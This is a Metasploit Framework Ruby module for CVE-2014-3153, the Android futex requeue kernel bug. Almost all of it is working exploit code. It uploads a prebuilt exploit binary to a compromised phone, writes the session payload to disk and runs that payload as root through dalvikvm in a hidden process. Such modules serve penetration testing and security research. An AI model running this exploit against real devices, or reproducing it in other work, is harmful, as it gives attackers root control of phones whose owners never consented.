# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;          => &#039;Android futex requeue kernel exploit&#039;,
        &#039;Description&#039;   => %q{
            This module exploits a bug in futex_requeue in the linux kernel.
            Any android phone with a kernel built before June 2014 should be vulnerable. 
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
            &#039;Pinkie Pie&#039;, #discovery 
            &#039;geohot&#039;, #towelroot
            &#039;timwr&#039; #metasploit module
        ],
        &#039;References&#039;    =>
        [
            [ &#039;CVE&#039;, &#039;2014-3153&#039; ],
            [ &#039;URL&#039;, &#039;http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/&#039; ],
            [ &#039;URL&#039;, &#039;http://blog.nativeflow.com/the-futex-vulnerability&#039; ],
        ],
        &#039;Platform&#039;       => &#039;android&#039;,
        &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
        &#039;Arch&#039;           => ARCH_DALVIK,
        &#039;DefaultOptions&#039; =>
          {
          },
        &#039;DefaultTarget&#039; => 0
      }
    ))

    register_options([
        OptString.new("WritableDir", [ true, "Temporary directory to write files", "/data/local/tmp/" ]),
    ], self.class)
  end

  def put_local_file(remotefile)
    localfile = File.join( Msf::Config.data_directory, "exploits", "CVE-2014-3153.elf" )
    data = File.read(localfile, {:mode => &#039;rb&#039;})
    write_file(remotefile, data)
  end

  def exploit
    workingdir = session.fs.dir.getwd
    exploitfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    payloadfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"

    put_local_file(exploitfile)
    cmd_exec(&#039;/system/bin/chmod 700 &#039; + exploitfile)
    write_file(payloadfile, payload.raw)

    tmpdir = datastore[&#039;WritableDir&#039;]
    rootclassdir = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}"
    rootpayload = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}.jar"

    rootcmd = " mkdir #{rootclassdir} && "
    rootcmd += "cd #{rootclassdir} && "
    rootcmd += "cp " + payloadfile + " #{rootpayload} && "
    rootcmd += "chmod 766 #{rootpayload} && "
    rootcmd += "dalvikvm -Xbootclasspath:/system/framework/core.jar -cp #{rootpayload} com.metasploit.stage.Payload"
    
    process = session.sys.process.execute(exploitfile, rootcmd, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
    process.channel.read
  end

end

